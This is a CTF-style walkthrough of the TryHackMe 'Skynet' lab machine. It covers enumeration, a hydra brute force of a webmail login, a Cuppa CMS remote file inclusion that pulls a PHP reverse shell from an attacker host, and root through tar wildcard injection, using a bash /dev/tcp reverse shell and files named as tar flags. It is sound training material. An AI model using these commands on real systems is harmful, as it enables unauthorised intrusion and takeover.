# Try Hack Me - Skynet

**Categories:** Gobuster, SMB, RFI  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.191.241`) in place of the target machine's IP address.

This guide is for a Try Hack Me walkthrough room - it broadly follows the path of the walkthrough, but does not directly answer the task questions.

## 1: Enumeration - nmap, gobuster

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP -p-`) followed by a version enumeration scan on the 6 discovered ports (22, 80, 110, 139, 143, 445) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ sudo nmap -p22,80,110,139,143,445 $IP -sV
...snip...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Alongside 22 and 80, ports 110 and 143 indicate that there is probably a MUA (mail user agent) active on the machine, and ports 139 and 445 indicate that SMB (samba) shares are available on the machine. Google and searchsploit show no relevant vulnerabilities for any of the discovered versions.

Navigating to the application on 80 reveals a search engine interface, but gives no additional information :

```html
<body>
    <div>
        <img src="image.png"/>
        <form name="skynet" action="#" method="POST"><br>
            <input type="search" class="search"><br>
            <input type="submit" class="button" name="submit" value="Skynet Search">
            <input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
        </form>
    </div>
</body>
```

so we start a gobuster scan using dirbuster's medium word list :

```console
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
...snip...
/admin                (Status: 301) [Size: 314] [--> http://10.10.191.241/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.191.241/css/]  
/js                   (Status: 301) [Size: 311] [--> http://10.10.191.241/js/]   
/config               (Status: 301) [Size: 315] [--> http://10.10.191.241/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.10.191.241/ai/]    
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.191.241/squirrelmail/]
```

The majority of the discovered paths require authentication, but the discovery of the `/squirrelmail` route confirms the presence of a mail user agent on the machine. Navigating to the route gives a login page, but we are unable to connect with basic credential pairs ("admin:admin", "admin:password" etc.)

## 2. Credential discovery - enum4linux

Enumerating the SMB shares using enumn4linux discovers a user "milesdyson" and 4 shares, one of which allows anonymous access :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ enum4linux $IP
...snip...
 ============================== 
|    Users on 10.10.191.241    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 

user:[milesdyson] rid:[0x3e8]
...snip...
[+] Attempting to map shares on 10.10.191.241
//10.10.191.241/print$  Mapping: DENIED, Listing: N/A
//10.10.191.241/anonymous       Mapping: OK, Listing: OK
//10.10.191.241/milesdyson      Mapping: DENIED, Listing: N/A
//10.10.191.241/IPC$    [E] Can't understand response:
```

We connect to the discovered anonymous share with smbclient and we discover 2 files - `attention.txt` and `log1.txt` (two other files on the share - `log2.txt` and `log3.txt` - are empty) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ smbclient \\\\$IP\\anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
```

`attention.txt` includes a note from Miles Dyson that "a system malfunction has caused various passwords to be changed", and `log1.txt` appears to be a list of possible passwords :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─cat log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
...snip...
```

From here we can try the discovered username ("milesdyson") and password list on the services requiring authentication - the SSH server, the `/squirrelmail` login page, and the milesdyson SMB share.

## 3. Service bruteforcing - hydra

Attempting to bruteforce SSH with hydra fails with the `log1.txt` password list :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ hydra -l milesdyson -P log1.txt $IP ssh
...snip...
[DATA] attacking ssh://10.10.191.241:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-04 21:41:49
```

but an attack on the `/squirrelmail` login page using hydra's http-post-form mode discovers a valid password :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
...snip...
[80][http-post-form] host: 10.10.191.241   login: milesdyson   password: PASSWORD
1 of 1 target successfully completed, 1 valid password found
```

Connecting to the inbox, we find 2 fluff emails ([although the story they reference is pretty interesting](https://www.theatlantic.com/technology/archive/2017/06/artificial-intelligence-develops-its-own-non-human-language/530436/)) and an email from `skynet@skynet` that refers to the password reset mentioned in `attention.txt` and reveals SMB credentials for the milesdyson user :

```
We have changed your smb password after system malfunction.
Password: PASSWORD
```

## 4. Directory discovery - smbclient

We return to smbcliet, connecting to the milesdyson share as the milesdyson user with the discovered credentials : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ smbclient \\\\$IP\\milesdyson --user=milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
```

In the notes directory we find a file `important.txt` that is a to-do list including a path to a "beta CMS" :

```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ cat important.txt  

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Navigating to the discovered route reveals a basic placeholder page, but a gobuster scan of the route (`gobuster dir -u $IP/45kra24zxs28v3yd -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`) reveals an `/administrator` route hosting a [Cuppa CMS](https://www.cuppacms.com/) login page : 

```html
<title>Cuppa CMS</title>
...snip...
    <div class="login_box">
        <form id="form_login" method="post" style="display:block">
            <div class="comment">Use a valid username and password to gain access to the administrator</div>
...snip...
```

(This page also includes a "display:none" password reset form. A password reset request for "milesdyson@skynet" receives a success response, but the reset email is never received.)

## 5. Foothold - Remote File Inclusion

The discovered credentials pairs don't work on the admin panel and no version information is available in the source, but Searchsploit finds a [local / remote file inclusion vulnerability for Cuppa CMS](https://www.exploit-db.com/exploits/25971). Local and remote files locations passed to the `cuppa/alerts/alertConfigField.php?urlConfig=` query param are included and executed (if php) or appended to the request output (if non-php). To exploit the vulnerability, we download and configure a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and host it on the attack machine (`python3 -m http.server 80`). We then set up a netcat listener and navigate to the vulnerable path, adding the route to the reverse shell to the urlConfig query param : 


```console
┌──(kali㉿kali)-[~/Documents/tthm/skynet]
└─$ curl $IP//45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACK-IP/rs.php
```

Cuppa then includes and executes the `rs.php` file and connects to the listener : 

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.191.241] 58532
...snip...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

The user flag is as `/home/milesdyson/user.txt`. At this point you can switch to the milesdyson user using the same password we used for the email account (you'll need to upgrade to a tty shell to use `su`), but this is not required for privesc to root.

## 5. Privesc, milesdyson -> root - cronjob, tar

Navigating to `/home/milesdyson/`, we find the previously discovered `mail` and `share` directories, along with a `backups` directory containing a `backup.tgz` archive and the following script `backup.sh` (which is only writeable and executable as root) :

```sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
We might assume then that this script is run at regular intervals to provide backups of the site at `/var/www/html`. Checking `/etc/crontab`, we find that it is run once a minute as the root user : 

```console
$ cat /etc/crontab
...snip...
# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```
The script doesn't give us much to go on, but [GTFObins provides the following way to get a shell out of tar](https://gtfobins.github.io/gtfobins/tar/) by exploiting the "checkpoint-action=" flag : 

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This is all well and good, but neither of the `www-data` or `milesdyson` users can write to the script to add these flags to the call to tar. But the asterisk wildcard in the `tar cf /home/milesdyson/backups/backup.tgz *` is interesting here. [Stackoverflow tells us that in cases like this, the shell expands the * wildcard before the command containing the wildcard is run](https://unix.stackexchange.com/questions/505707/how-is-the-wildcard-interpreted-as-a-command) - this means that running `tar *` in a directory containing files "a.txt b.txt" would result in the command "tar a.txt b.txt". Presumably then we can create files with names matching the flags required to force tar to run our reverse shell - googling "tar asterisk wildcard exploit" seems to confirm this too.

To perform the exploit, we first create a bash reverse shell in `/var/www/html` :

```console
$ cd /var/www/html
$ echo "bash -i >& /dev/tcp/ATTACK-IP/6666 0>&1" > rs.sh
```

We then create two additional files, one for each of the flags required to initiate a shell with tar : 

```console
$ echo "" > "--checkpoint=1"
$ echo "" > "--checkpoint-action=exec=bash rs.sh"
```

After a minute or so, `backup.sh` is run by cron and the reverse shell connects back to a listener on our attack machine : 

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.191.241] 36704
...snip...
root@skynet:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.
